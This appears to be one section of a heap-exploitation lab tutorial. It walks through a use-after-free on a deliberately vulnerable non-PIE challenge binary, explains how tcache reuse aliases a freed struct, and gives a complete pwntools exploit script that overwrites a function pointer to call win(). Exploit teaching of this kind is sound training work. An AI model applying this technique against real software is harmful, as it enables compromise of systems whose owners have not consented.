### Account Vault - UAF Function Pointer

> x Exam (55)

The first guided example translates the theoretical UAF primitive directly into a working exploit on a binary that ships without Position Independent Executable (PIE), a deliberate simplification that eliminates the need for a code-base leak and allows full attention to be focused on the heap mechanics alone.

The program manages a single `User` struct whose definition is the following:

```c
struct User {
    void (*action)(struct User *);  /* function pointer — 8 B */
    char name[24];                  /* 24 B                   */
};  /* total: 32 B  →  tcache size class 0x20 (chunk size 0x30) */
```

The struct occupies exactly 32 bytes of user data, which, after the 16-byte chunk header, yields a total chunk size of `0x30`. This places every allocation of this struct into the tcache bin for size class `0x20`. The challenge is located in `00_account_vault/`, with the binary at `00_account_vault/account_vault`, the source at `00_account_vault/main.c`, and both the pinned libc (`libc.so.6`, glibc 2.39) and loader (`ld-linux-x86-64.so.2`) present in the same directory.

The program exposes five menu options, each mapping cleanly to a primitive. Option 1 is an **alloc** primitive: it calls `malloc(sizeof(struct User))` and sets `action = lose`. Option 2 is a **free** primitive with a critical flaw: it calls `free(user)` but does not null the global pointer afterward, leaving it dangling. Option 3 is a second **alloc** primitive of the same size class: it calls `malloc(sizeof(struct User))` and reads attacker-controlled bytes into the returned chunk. Option 4 is an **invoke** primitive: it calls `user->action(user)` through the dangling pointer. Option 5 exits.

**Step 1: Inspecting the Binary**

The first action in any exploitation session is to run `checksec` to establish which mitigations are active:

```bash
checksec --file ./account_vault
```

The output reveals that NX is enabled, PIE is disabled, a stack canary is not present, and RELRO is partial. The critical observation is that PIE is off, meaning the address of every symbol in the binary, including the `win` function, is fixed and identical across every execution. No information leak is required for this challenge: the address of `win` is readable directly from the ELF with `elf.sym.win` in pwntools.

**Step 2: Identifying the Primitive**

Reading `main.c` confirms that option 2 calls `free(user)` without subsequently writing `NULL` into the `user` global variable. Option 3 calls `malloc(sizeof(struct User))`, which is the same size as the freed chunk, and then passes the returned pointer to `read`, accepting attacker-controlled bytes for the full 32 bytes of the struct. The key observation that makes this exploitable is the LIFO behavior of the tcache: the chunk freed by option 2 is placed at the head of the tcache list for size class `0x20`, and the very next `malloc` of that size class retrieves exactly that same chunk. The dangling `user` pointer and the freshly returned "data" pointer therefore alias the same physical memory address. Whatever bytes option 3 writes into the "data" buffer are immediately visible as the fields of the `User` struct through the dangling `user` pointer, including the first eight bytes, which are interpreted as `action`.

**Step 3: Heap Timeline**

The following sequence of operations describes the heap state at each step:

```
1. Option 1: Allocate User
   -> malloc(0x20) returns chunk A
   -> user = A
   -> A->action = lose

2. Option 2: Free User
   -> free(A)
   -> A enters tcache[0x20], user still points to A (dangling)

3. Option 3: Allocate Data (same size)
   -> malloc(0x20) returns A  (tcache LIFO: same chunk)
   -> read writes 32 attacker bytes into A
   -> first 8 bytes: p64(win)
   -> remaining 24 bytes: padding
   -> now A->action == win, visible through dangling user pointer

4. Option 4: Execute Action
   -> calls user->action(user)
   -> user->action == win
   -> win() executes
```

**Step 4: The Complete Exploit**

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./account_vault', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = conn()

win = elf.sym.win

p.sendlineafter(b'> ', b'1')                        # Allocate User
p.sendlineafter(b'> ', b'2')                        # Free User
p.sendlineafter(b'> ', b'3')                        # Allocate Data
p.sendafter(b'data: ', p64(win).ljust(32, b'X'))    # Overwrite action with &win
p.sendlineafter(b'> ', b'4')                        # Execute Action -> win()

print(p.recvall(timeout=1).decode(errors='replace'))
```

The payload is constructed by encoding the address of `win` as a little-endian 64-bit integer occupying the first eight bytes of the 32-byte write, followed by 24 bytes of arbitrary padding filling the `name` field. When option 4 is subsequently called, the program reads `user->action`, which is now `win`, and calls it, producing the flag.

To verify the heap mechanics in GDB, a breakpoint placed immediately after option 2's `free` call and the `tcache` command will confirm that chunk A appears at the head of the `0x20` bin. After option 3 returns, the `heap` command will confirm that `malloc` returned the same address as chunk A, and `x/4gx <addr>` on that address will show `win`'s address in the first quadword.

> **Key takeaway:** The UAF function-pointer overwrite is the simplest possible heap exploit: no libc leak, no safe-linking computation, no multi-stage chain. Its power comes entirely from the tcache's unconditional LIFO recycling and the program's failure to null the pointer after `free`. The pattern of free-without-null followed by a same-size allocation is the canonical UAF setup, and recognizing it in source code is the first skill this laboratory develops.